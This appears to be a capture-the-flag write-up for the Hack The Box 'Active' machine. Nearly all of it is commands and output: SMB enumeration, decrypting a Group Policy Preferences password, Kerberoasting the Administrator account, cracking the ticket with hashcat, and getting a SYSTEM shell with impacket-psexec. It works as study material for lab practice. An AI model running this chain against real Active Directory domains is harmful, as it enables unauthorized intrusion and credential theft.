
### Initial access
Nmap
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49170/tcp open  unknown
49173/tcp open  unknown

```
Recon smb we have pass
```
impacket-smbclient :''@10.129.36.144 
# cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

# get Groups.xml
# pwd
/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
# 

```

```
┌──(kali㉿kali)-[~/HTB/Active]
└─$ impacket-Get-GPPPassword LOCAL -xmlfile Groups.xml
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Found a Groups XML file:
[*]   file      : Groups.xml
[*]   newName   : 
[*]   userName  : active.htb\SVC_TGS
[*]   password  : GPPstillStandingStrong2k18
[*]   changed   : 2018-07-18 20:46:06


```

We have cred `active.htb\SVC_TGS:GPPstillStandingStrong2k18`

SMB acces with new cred
```
┌──(kali㉿kali)-[~/HTB/Active]
└─$ impacket-smbclient 'active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.129.36.144'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# 

```
### Lateral Movement
Kerberoasting
```bash
┌──(kali㉿kali)-[~/HTB/Active]
└─$ faketime "$(ntpdate -q 10.129.36.144 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.36.144 -request -outputfile kerberos1.hash 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-09-08 04:31:24.972933             



[-] CCache file is not found. Skipping...

┌──(kali㉿kali)-[~/HTB/Active]
└─$ sudo hashcat -m 13100 kerberos1.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force 

hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8700G w/ Radeon 780M Graphics, 2901/5802 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 66

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (4270 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344388
* Bytes.....: 139921531
* Keyspace..: 946729608

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$4a0cba2b895497a2c88732b9124d9c26$7322cae8761ff24b31b8d4779b2ed33d3a36ce862ad6c78409fd4587cca9bfc3347f1f1dd597f48ce05add4c0244daebe5c922e0ab049e8caa6d04b6fc65a4036c39b2930308e6c735e76e9ce1c4533673a4158c8e443641301661a1ab63ff8a2fe22a147398302e2bb9e1711c1d21c7e6927282be9dcb124b812b3d13f9904fa4f677bacbefbbac23aa837278cc98a10574fd3ac68524461b49ccb10e52cff1b5c2cb4d6c9f3c0806e4077c5a9d0dae249abcbf349947521ccbe80b5f2d2774e2f9acd9280cc558b72de53e55f6a8448c86c50d9180f2900ce3dc24d7bef881608b27bdf75ae3b3e3ad2709e46a8fd0496fa8b66d96d8102e0b710c4550b03224a90bf8d8455c44681cec3ff2b747d86bfc81deb6a1703d6fb57b441861325041c3663e05bc4c052f29f0fe89e3842bf36200afc0890626cec92cf36ecc9bb9570c9dd065ce956114702fac8db4e0a0439abfd26e7c231e661c2c4508480e29b9406670a22023810bf30e4d4bb1a34c096f737db3a64688d55bbb8a640fdfd2d453f176198b7f106e8fa4a765f2163410c1d4630b8f83b6844f096e634726c56234842051e660b472ab36c0288de08c638f5f76f8044c12989022b0ea1acd4458b29bff4fa2e7ff1665dd739ce19ce3890c24d2c35c399660bcbe3c9905ab9c8f3f109dea14f36f97e826d5072d7512cc8bbac32a1b1756766666ec78fe961c09f8ae76392c1f0a99018009101a230151cdb607e212a66d277b1e69feae00dc880cb24de49409ad52fc0c3d3d55b28587baa3afee50529c4e56bcc552490000a9097a789dbca4f8ba4b40261ef26faa659e1180a28071b63f56052b5ab088b1ce6ca07f5382c998a7e49595cd82d3dd28b6d4b33809bbb8694b215a2e2572d6b5c7e893231a139ab12b35a7c8437d0c2c7c8addc0af7b2b28c5bc92fde374375f97741d41f85ffdaa77622cac48b9aab63f3fc2b5353cb705e1c28b0f8ddf84bd68250adb291ba4bd66468b8378b54f0f05f9f8db6f5d6517288f47db15a2a0c3723b5f7d19ca2ff69c6917d8f012b7b00f78a3a8822210aae2d743bedd056ca5cf9a0ebf6ab0a402ce82899401c1ad68f868166bf68d948ae3128533feb6a4169a6c1f4d821417311e89dd383837b1d87626f5c0c688ad53a73e5c545adf05773f11274d7947bd014c782c2258bf8740394f5abdf431f82874555dcbabc47ee27289ae98681aea571f28c5c6c3f302244e340ddf5bcc9051ad:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...9051ad
Time.Started.....: Tue Sep  8 05:19:09 2026, (1 min, 45 secs)
Time.Estimated...: Tue Sep  8 05:20:54 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6637.0 kH/s (6.38ms) @ Accel:166 Loops:64 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 695484224/946729608 (73.46%)
Rejected.........: 0/695484224 (0.00%)
Restore.Point....: 10536352/14344388 (73.45%)
Restore.Sub.#01..: Salt:0 Amplifier:0-64 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#01...: Tigrou -> 2010

Started: Tue Sep  8 05:19:08 2026
Stopped: Tue Sep  8 05:20:55 2026

```
### Priv escalation
Cred `Administrator:Ticketmaster1968`
┌──(kali㉿kali)-[~/HTB/Active]
└─$ impacket-psexec Administrator:Ticketmaster1968@10.129.36.144                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.36.144.....
[*] Found writable share ADMIN$
[*] Uploading file CljhXpUT.exe
[*] Opening SVCManager on 10.129.36.144.....
[*] Creating service nKId on 10.129.36.144.....
[*] Starting service nKId.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system


